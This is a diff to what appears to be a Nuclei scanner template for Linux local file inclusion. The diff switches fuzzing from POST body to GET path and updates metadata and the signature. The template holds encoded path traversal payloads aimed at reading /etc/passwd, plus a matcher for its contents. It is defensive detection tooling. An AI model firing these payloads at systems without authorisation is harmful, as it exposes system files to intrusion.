@@ -1,19 +1,21 @@
-id: linux-lfi-fuzz-post
+id: linux-lfi-fuzz-path
 
 info:
   name: Local File Inclusion - Linux
-  author: DhiyaneshDK,serhatcck
+  author: DhiyaneshDK
   severity: high
   reference:
     - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/Intruder/directory_traversal.txt
     - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
+  metadata:
+    max-request: 46
   tags: lfi,dast,linux
 
 http:
   - pre-condition:
       - type: dsl
         dsl:
-          - 'method == "POST"'
+          - 'method == "GET"'
 
     payloads:
       nix_fuzz:
@@ -106,10 +108,9 @@ http:
           - '%2f%2f%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd'
           - '%2f%2f%2f%2f%2f%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd'
 
-
     fuzzing:
-      - part: body
-        type: replace # replaces existing parameter value with fuzz payload
+      - part: path
+        type: postfix # replaces existing parameter value with fuzz payload
         mode: multiple # replaces all parameters value with fuzz payload
         fuzz:
           - '{{nix_fuzz}}'
@@ -120,4 +121,4 @@ http:
         part: body
         regex:
           - 'root:.*:0:0:'
-# digest: 4b0a00483046022100a1e70a22bc4f17a046a9b366a9015608da82f88439ab75d052b64088a7009da8022100e29c115d86b47951f1da2fb56d7953ec1e59e93d86b70d24d34ad8c14ad3064d:922c64590222798bb761d5b6d8e72950
+# digest: 4a0a0047304502201826f685956c3337da374fe68d92ed5a4785715d95b5de18bdf71e67e3e3dd5a022100b5c835a996c860de0777d15324ce81dc5ee29a2ec11196e218e72e2a9b1196e9:922c64590222798bb761d5b6d8e72950
